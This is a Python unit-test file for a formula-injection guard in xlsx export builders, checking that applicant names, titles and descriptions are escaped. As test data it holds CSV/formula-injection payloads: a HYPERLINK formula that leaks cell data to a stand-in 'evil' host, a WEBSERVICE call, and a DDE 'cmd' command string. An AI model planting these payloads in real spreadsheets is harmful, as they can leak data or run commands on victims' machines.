"""Formula-injection guard for the xlsx workbook builders (AUD-008).

Excel and LibreOffice must not evaluate an attacker-controlled string as an active
formula. Such a string is the application title, the applicant name, the form data or
the booking description. These are pure unit tests. They need no database, no Docker
and no network.
"""

from __future__ import annotations

from datetime import datetime
from decimal import Decimal
from io import BytesIO
from typing import Any
from uuid import uuid4

import pytest
from openpyxl import load_workbook

from app.modules.applications.schemas import ApplicationListItem
from app.modules.budget.tree_schemas import BudgetTreeNodeOut
from app.shared import xlsx


def _load(data: bytes) -> Any:
    return load_workbook(BytesIO(data))


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("http://evil/?"&A1,"click")',
        "=1+2",
        "+1",
        "-1+cmd",
        "@SUM(A1)",
        "\t=1+1",
        "\r=1+1",
    ],
)
def test_safe_neutralizes_formula_prefixes(payload: str) -> None:
    out = xlsx._safe(payload)
    assert isinstance(out, str)
    assert out == "'" + payload
    assert out[0] == "'"


@pytest.mark.parametrize("benign", ["Hallo Welt", "VS-800-40", "", "123 abc"])
def test_safe_passes_through_benign_strings(benign: str) -> None:
    assert xlsx._safe(benign) == benign


def test_safe_passes_through_non_strings() -> None:
    assert xlsx._safe(None) is None
    assert xlsx._safe(3.5) == 3.5
    assert xlsx._safe(0) == 0


# build_auskunft_workbook is the most exposed sink. Public applicants feed it.
def test_auskunft_escapes_applicant_name_and_json_data() -> None:
    payload_name = '=HYPERLINK("http://evil/?"&A1,"click")'
    apps = [
        {
            "id": uuid4(),
            "typeName": "=WEBSERVICE(\"http://evil\")",
            "status": "submitted",
            "createdAt": None,
            "applicantName": payload_name,
            "data": {"mySelect": "=1+2"},
        }
    ]
    data = xlsx.build_auskunft_workbook(
        email="user@example.org",
        applications=apps,
        versions=[],
        principal=None,
    )
    ws = _load(data)["Anträge"]
    # Row 2 is the first data row. Row 1 is the header.
    type_cell = ws.cell(row=2, column=2).value
    name_cell = ws.cell(row=2, column=5).value
    json_cell = ws.cell(row=2, column=6).value
    assert name_cell == "'" + payload_name
    assert type_cell.startswith("'=WEBSERVICE")
    # json.dumps returns a string that starts with {, which is harmless. The mySelect
    # value stays inside the JSON and Excel does not evaluate it.
    assert json_cell.startswith("{")
    assert "=1+2" in json_cell
    # No cell may persist as an active formula.
    for col in range(1, 7):
        val = ws.cell(row=2, column=col).value
        assert not (isinstance(val, str) and val[:1] in xlsx._FORMULA_PREFIXES)


def test_auskunft_escapes_account_principal_fields() -> None:
    data = xlsx.build_auskunft_workbook(
        email="=cmd|'/c calc'!A1",
        applications=[],
        versions=[],
        principal={"sub": "=1+1", "email": "+x", "displayName": "@y", "active": True},
    )
    ws = _load(data)["Konto"]
    # The email of the request sits in row 2.
    assert ws.cell(row=2, column=2).value.startswith("'=cmd")
    assert ws.cell(row=3, column=2).value == "'=1+1"
    assert ws.cell(row=4, column=2).value == "'+x"
    assert ws.cell(row=5, column=2).value == "'@y"


def test_applications_escapes_title() -> None:
    item = ApplicationListItem.model_validate(
        {
            "id": uuid4(),
            "typeId": uuid4(),
            "title": "=2+5",
            "state": None,
            "gremiumId": None,
            "amount": None,
            "currency": "EUR",
            "createdAt": datetime(2026, 6, 1, 9, 30),
            "updatedAt": datetime(2026, 6, 2, 10, 0),
        }
    )
    data = xlsx.build_applications_workbook(
        [item], type_names={}, gremium_names={}
    )
    ws = _load(data)["Anträge"]
    assert ws.cell(row=2, column=1).value == "'=2+5"


class _Expense:
    def __init__(self, description: str) -> None:
        self.created_at = None
        self.kind = "expense"
        self.description = description
        self.path_key = "VS-800"
        self.application_title = None
        self.account_name = None
        self.amount = None
        self.currency = "EUR"


def test_expenses_escapes_description() -> None:
    data = xlsx.build_expenses_workbook([_Expense("=SUM(1,2)")])
    ws = _load(data)["Buchungen"]
    assert ws.cell(row=2, column=3).value == "'=SUM(1,2)"


def test_budget_escapes_node_name() -> None:
    fy = uuid4()
    alloc = {
        "fiscalYearId": fy,
        "allocated": Decimal("1"),
        "committed": Decimal("0"),
        "requested": Decimal("0"),
        "available": Decimal("1"),
    }
    root = BudgetTreeNodeOut.model_validate(
        {
            "id": uuid4(),
            "parentId": None,
            "gremiumId": None,
            "key": "x",
            "pathKey": "VS",
            "name": "=1+1",
            "currency": "EUR",
            "active": True,
            "byFiscalYear": [alloc],
            "children": [],
        }
    )
    data = xlsx.build_budget_workbook([root], fiscal_year_labels={fy: "2026"})
    wb = _load(data)
    ws = wb[wb.sheetnames[0]]
    assert ws.cell(row=2, column=1).value == "'=1+1"
